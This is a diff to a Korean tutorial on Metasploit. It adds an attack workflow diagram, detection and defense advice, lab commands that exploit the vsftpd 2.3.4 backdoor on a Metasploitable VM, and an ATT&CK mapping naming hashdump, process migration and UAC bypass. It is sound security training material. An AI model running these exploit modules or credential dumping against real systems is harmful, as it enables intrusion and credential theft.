@@ -13,7 +13,23 @@ categories: [hacking-tools]
 
 ---
 
-## 2. 핵심 모듈 구조
+## 2. 공격 워크플로우
+
+```mermaid
+flowchart LR
+    A[정보 수집] --> B[취약점 검색]
+    B --> C[Exploit 선택]
+    C --> D[Payload 설정]
+    D --> E[공격 실행]
+    E --> F{성공?}
+    F -->|Yes| G[Meterpreter 세션]
+    F -->|No| B
+    G --> H[Post-Exploitation]
+```
+
+---
+
+## 3. 핵심 모듈 구조
 
 *   **Exploits (익스플로잇)**: 특정 취약점을 공격하여 시스템에 침투하는 코드이다. (예: `windows/smb/ms17_010_eternalblue`)
 *   **Payloads (페이로드)**: 공격 성공 후 대상 시스템에서 실행될 악성 코드이다. 쉘 연결(`reverse_tcp`), 미터프리터(`meterpreter`) 등이 있다.
@@ -150,5 +166,60 @@ run
 # 실행
 msfconsole -r attack.rc
 ```
+
+---
+
+## 8. 방어 대책
+
+### 탐지 방법
+*   **IDS/IPS 시그니처**: Snort, Suricata에서 Metasploit 페이로드 패턴 탐지
+*   **EDR 모니터링**: 프로세스 인젝션, 메모리 조작 행위 탐지
+*   **네트워크 트래픽 분석**: 비정상적인 Outbound 연결 (C2 통신) 탐지
+
+### 방어 방법
+*   **패치 관리**: 알려진 취약점(CVE) 신속 패치
+*   **네트워크 세그멘테이션**: 중요 자산 분리
+*   **최소 권한 원칙**: 서비스 계정 권한 제한
+*   **Application Whitelisting**: 허용된 프로그램만 실행
+
+---
+
+## 9. 실습 환경
+
+### Metasploitable 2
+```bash
+# VirtualBox에서 취약한 VM 실행
+# https://sourceforge.net/projects/metasploitable/
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+exploit
+```
+
+### Metasploitable 3
+```bash
+# Vagrant로 Windows/Linux 취약 환경 구축
+# https://github.com/rapid7/metasploitable3
+vagrant up
+```
+
+### Docker 기반
+```bash
+docker run -it --rm tleemcjr/metasploitable2
+```
+
+---
+
+## MITRE ATT&CK 매핑
+
+| Metasploit 기능 | ATT&CK 기법 | ID | 단계 |
+|----------------|------------|-----|------|
+| Exploit 모듈 | Exploitation of Public-Facing Application | T1190 | Initial Access |
+| Meterpreter Reverse Shell | Command and Scripting Interpreter | T1059 | Execution |
+| `hashdump` | OS Credential Dumping | T1003 | Credential Access |
+| `migrate` | Process Injection | T1055 | Defense Evasion |
+| `autoroute` | Network Tunneling | T1572 | Command and Control |
+| Post 모듈 (enum_*) | Account Discovery / System Information Discovery | T1087 / T1082 | Discovery |
+| `bypassuac` | Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 | Privilege Escalation |
 
 <hr class="short-rule">
